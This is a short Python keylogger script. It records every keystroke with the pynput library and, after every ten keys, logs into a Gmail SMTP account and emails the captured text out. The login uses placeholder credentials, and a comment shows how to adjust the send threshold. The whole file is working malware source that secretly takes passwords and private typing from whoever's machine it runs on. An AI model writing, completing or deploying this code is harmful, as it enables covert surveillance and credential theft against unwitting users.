from pynput.keyboard import Listener,Key
import smtplib,ssl
key_count = 0
key_list = []
def on_press(key):
    global key_count
    key_list.append(str(key))
    key_count += 1
    key_string = ''.join(key_list)
    list(key_string)
    strings = []
    for char in key_string:
        if char != "'":
            strings.append(char)
    if key_count == 10:#You can change the number of letters to send
        context = ssl.create_default_context()
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls(context=context)  # Secure the connection
            server.login("YOUR_EMAIL", "YOUR_PASS")
            server.sendmail("YOUR_EMAIL","YOUR_PASS",''.join(strings))
            del strings[0:]
        except Exception as e:
            # Print any error messages to stdout
            print(e)
        finally:
            server.quit()
        key_count = 0
with Listener(on_press=on_press) as l:
    l.join()
